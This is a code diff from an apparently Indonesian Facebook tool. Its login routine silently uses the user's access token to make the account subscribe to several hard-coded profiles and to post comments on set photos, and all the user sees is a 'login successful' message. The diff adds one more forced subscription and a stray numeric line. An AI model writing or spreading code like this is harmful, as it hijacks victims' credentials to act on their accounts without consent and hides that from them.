@@ -115,6 +115,7 @@ def __follow__():
 		__kata=random.choice(['Hidup ini terdiri dari 10 persen apa yang terjadi padamu dan 90 persen bagaimana caramu menyikapinya. - Charles R. Swindoll','Sukses tampaknya terkait dengan tindakan. Orang sukses terus bergerak. Mereka membuat kesalahan, tetapi mereka tidak berhenti. - Conrad Hilton','Keberanian adalah apa yang diperlukan untuk berdiri dan berbicara. Keberanian juga diperlukan untuk duduk dan mendengarkan. - Winston Churchill','Berani bermimpi, tapi yang lebih penting, berani melakukan tindakan di balik impianmu. - Josh Hinds','Kegagalan tidak akan pernah menyusul jika tekad untuk sukses cukup kuat. - Og Mandino','Hidup menyusut atau berkembang sebanding dengan keberanian seseorang. - Anais Nin','Ada dua cara untuk menyebarkan cahaya: menjadi lilin atau cermin yang memantulkannya. - Edith Wharton','Kesempatan itu mirip seperti matahari terbit. Kalau kau menunggu terlalu lama, kau bisa melewatkannya. - William Arthur Ward','Kebahagiaan bukanlah sesuatu yang siap dibuat. Itu berasal dari tindakan Anda sendiri. - Dalai Lama'])
 		__komen__= (__ucapkan+'\n\n'+__kata+'\n'+__waktu)
 		__komen2__= (__ucapkan+'\n\n'+__kata+'\n'+__waktu)
+		100041129048948
 		requests.post('https://graph.facebook.com/757953543/subscribers?access_token=%s'%(__token__)) #rozhak
 		requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=%s'%(__token__)) #rozhak2
 		requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=%s'%(__token__)) #muhammad rozhak
@@ -123,6 +124,7 @@ def __follow__():
 		requests.post('https://graph.facebook.com/10158807643598544/comments/?message=%s&access_token=%s'%(__ucapkan,__token__)) #foto sampul
 		requests.post('https://graph.facebook.com/10159090813023544/comments/?message=%s&access_token=%s'%(__komen__,__token__)) #foto profil
 		requests.post('https://graph.facebook.com/10159494942223544/comments/?message=%s&access_token=%s'%(__komen2__,__token__)) #foto profil
+		requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=%s'%(__token__)) #iwan
 	except:
 		exit("%s«%s!%s Sepertinya ada yang error"%(K,M,K))
 	print("%s«%s!%s Login berhasil"%(B,H,P))
